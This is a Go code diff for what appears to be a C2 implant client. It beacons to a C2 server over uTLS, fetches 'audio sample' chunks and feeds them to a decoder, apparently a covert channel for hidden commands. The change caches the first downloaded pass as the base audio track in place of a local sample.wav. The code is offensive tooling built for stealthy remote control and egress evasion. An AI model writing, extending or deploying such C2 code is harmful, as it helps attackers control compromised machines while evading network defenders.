@@ -14,7 +14,7 @@ import (
 	"strconv"
 	"os/exec"
 	"runtime"
-	"os"
+	//"os"
 	"bufio"
 	"bytes"
 	"mime/multipart"
@@ -31,6 +31,8 @@ var c2_server_ip string
 var c2_hostname ="c2.egress-whisperer.local"
 var timeout time.Duration
 var echo_to_stdout = "off"
+var firstLoopDone = "false"
+var	baseAudioTrack []byte
 
 var http_request_string_pre = "GET /api/v1/sample/chunk/"
 var http_request_string_pro = " HTTP/1.1\r\n" +
@@ -84,6 +86,7 @@ func invokeParallelDialups(port string, wg *sync.WaitGroup, resultChan chan<- di
 	initialBurst :=20
 	chunkIndex :=0
 	conn_err_retry_count :=0
+	
 	for{//ideally this loop sleeps for 2 secs every operation, sends a GET req from line 70, and reads data from reader, calls decode engine
 
 		http_request_string := http_request_string_pre + strconv.Itoa(chunkIndex) + http_request_string_pro
@@ -118,9 +121,14 @@ func invokeParallelDialups(port string, wg *sync.WaitGroup, resultChan chan<- di
 				if err!=nil{
 					fmt.Println("read error 2 - ", err)
 				}
+				if firstLoopDone=="false"{
+					baseAudioTrack = append(baseAudioTrack, data...)
+				}
+
 				isLastChunk := resp.Header.Get("X-Last-Chunk")
 				if isLastChunk == "true"{
 					chunkIndex=-1
+					firstLoopDone="true"
 				}
 	        	resp.Body.Close()
 
@@ -179,10 +187,8 @@ func decoderEngine(buf []byte, uConn *utls.UConn, reader *bufio.Reader){
 		//fmt.Println("Recieved ", n, " bits with value", string(buf[:n]), "and bytes ", buf[:n])
 	}
 }
-var	baseAudioTrack []byte
+
 func main(){
-	//remove this once /download or storing the file on first loop is established
-	baseAudioTrack, _ = os.ReadFile("sample.wav")
 
 	//user input collection
 	target  := flag.String("target", "", "C2 server IP address (required)")
